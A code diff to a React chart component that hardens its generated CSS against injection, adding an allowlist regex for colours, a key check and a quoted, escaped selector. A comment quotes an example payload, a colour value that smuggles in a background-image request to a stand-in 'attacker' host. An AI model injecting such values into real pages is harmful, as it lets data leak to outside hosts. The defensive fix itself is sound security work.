@@ -69,6 +69,36 @@ function ChartContainer({
   )
 }
 
+// Rendering this CSS as a JSX text child stops it breaking out into HTML, but
+// that alone does not make the interpolation safe. A CSS custom property's
+// value is not validated by the CSS parser -- it is stored as an almost
+// arbitrary token sequence and only interpreted where it is substituted -- so
+// a colour of `red; background-image: url(https://attacker/?q=` survives to
+// close the declaration and open an outbound request. The selector is the same
+// story: an unquoted `[data-chart=...]` value ends at the first space or `]`.
+//
+// `config` and `id` come from whoever renders <ChartContainer>. Nothing in this
+// repository calls it yet, so none of this is reachable today -- but this is a
+// design-system component that exists to be called, and the guarantee belongs
+// with the component rather than with every future caller.
+
+// Allowlist the shapes a colour legitimately takes rather than blocklisting
+// dangerous ones; a blocklist here has to anticipate every CSS escape and
+// comment syntax, and misses quietly. `hsl(var(--chart-1))` is the common
+// shadcn form, so nested var() is permitted inside a colour function -- but
+// only var(), which cannot itself fetch anything. Bare words are allowed
+// inside the parens for colourspace keywords (`color(display-p3 1 0 0)`,
+// `hsl(from ... h s l)`); they cannot become a fetch, because `(` is not in
+// the inner set, so no second function can be formed except that var().
+const CSS_VAR = String.raw`var\(--[a-zA-Z0-9_-]+\)`
+const COLOR_FN = String.raw`(?:rgba?|hsla?|hwb|lab|lch|oklab|oklch|color)`
+const SAFE_COLOR = new RegExp(
+  `^(?:#[0-9a-fA-F]{3,8}|[a-zA-Z]+|${CSS_VAR}|${COLOR_FN}\\((?:[\\sa-zA-Z0-9.%,/+-]|${CSS_VAR})*\\))$`,
+)
+
+// A custom property name; also what gets interpolated after `--color-`.
+const SAFE_KEY = /^[a-zA-Z0-9_-]+$/
+
 const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
   const colorConfig = Object.entries(config).filter(
     ([, config]) => config.theme || config.color,
@@ -78,19 +108,30 @@ const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
     return null
   }
 
+  // Quote the attribute selector and escape what can terminate the string, so
+  // the selector still matches the `data-chart` value rendered above whatever
+  // the id contains.
+  const selectorId = id.replace(/["\\]/g, '\\$&')
+
   return (
     <style>
       {Object.entries(THEMES)
         .map(
           ([theme, prefix]) => `
-${prefix} [data-chart=${id}] {
+${prefix} [data-chart="${selectorId}"] {
 ${colorConfig
   .map(([key, itemConfig]) => {
     const color =
       itemConfig.theme?.[theme as keyof typeof itemConfig.theme] ||
       itemConfig.color
-    return color ? `  --color-${key}: ${color};` : null
+    // Drop just the offending declaration rather than throwing: a malformed
+    // colour should cost one series its custom colour, not blank the chart.
+    if (!color || !SAFE_KEY.test(key) || !SAFE_COLOR.test(color)) {
+      return null
+    }
+    return `  --color-${key}: ${color};`
   })
+  .filter(Boolean)
   .join('\n')}
 }
 `,
